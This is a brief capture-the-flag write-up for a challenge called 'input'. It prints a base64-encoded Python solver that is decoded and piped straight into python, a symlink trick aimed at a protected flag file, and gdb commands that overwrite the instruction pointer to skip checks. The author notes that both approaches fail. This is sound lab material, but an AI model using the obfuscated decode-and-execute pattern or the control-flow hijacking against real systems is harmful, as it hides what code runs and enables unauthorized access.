# `input` Solution

Solution generation:

    base64 pwn.py | python -c "import sys;print 'echo %s | base64 -d | python' % sys.stdin.read().replace('\n', '')"

In order to be able to write file I must move to `/var/tmp`:

    cd /var/tmp

    ln -sf ~/flag ./flag

    echo IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCgppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgc3VicHJvY2VzcyBhcyBzcAppbXBvcnQgc29ja2V0CmltcG9ydCB0aW1lCgoKZGVmIG1haW4oKToKICAgICMgU3RhZ2UgMQogICAgYSA9IFsoJ0ElaScgJSBpKSBmb3IgaSBpbiByYW5nZSg5OSldCiAgICBhWzY0XSA9ICIiCiAgICBhWzY1XSA9ICJceDIwXHgwYVx4MGQiCiAgICBhWzY2XSA9ICI0NDQ0IiAgIyBTdGFnZSA1IHBvcnQKCiAgICAjIFN0YWdlIDMKICAgIG9zLmVudmlyb25bIlx4ZGVceGFkXHhiZVx4ZWYiXSA9ICJceGNhXHhmZVx4YmFceGJlIgoKICAgICMgU3RhZ2UgNAogICAgb3BlbigiXHgwYSIsICJ3Iikud3JpdGUoIlx4MDBceDAwXHgwMFx4MDAiKQoKICAgICMgU3RhZ2UgMgogICAgciwgdyA9IG9zLnBpcGUoKQogICAgcCA9IHNwLlBvcGVuKFsnL2hvbWUvaW5wdXQyL2lucHV0J10gKyBhLCBzdGRpbj1zcC5QSVBFLCBzdGRlcnI9cikKCiAgICBvcy5jbG9zZShyKQogICAgb3Mud3JpdGUodywgIlx4MDBceDBhXHgwMlx4ZmYiKQogICAgb3MuY2xvc2UodykKCiAgICBwLnN0ZGluLndyaXRlKCJceDAwXHgwYVx4MDBceGZmIikKCiAgICAjIFN0YWdlIDUKICAgIHRpbWUuc2xlZXAoMSkKCiAgICBob3N0ID0gJzEyNy4wLjAuMScKICAgIHBvcnQgPSA0NDQ0CiAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgcy5jb25uZWN0KChob3N0LCBwb3J0KSkKICAgIHMuc2VuZGFsbCgiXHhkZVx4YWRceGJlXHhlZiIpCiAgICBzLmNsb3NlKCkKCiAgICBwLndhaXQoKQoKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBtYWluKCkK | base64 -d | python

# Problems

Unfortunately because of symlink protection that is on this trick is not possible anymore:
* https://stackoverflow.com/questions/26496352/symlink-giving-permission-denied-to-root
* https://wiki.ubuntu.com/SecurityTeam/Roadmap/KernelHardening#Symlink_Protection
* https://utcc.utoronto.ca/~cks/space/blog/linux/Ubuntu1204Symlinks

I also tried directly using gdb:

    break *0x0040097b
    run
    set $rip = 0x00400c86
    continue

But returned:

    /bin/cat: flag: Permission denied
    [Inferior 1 (process 3451) exited normally]
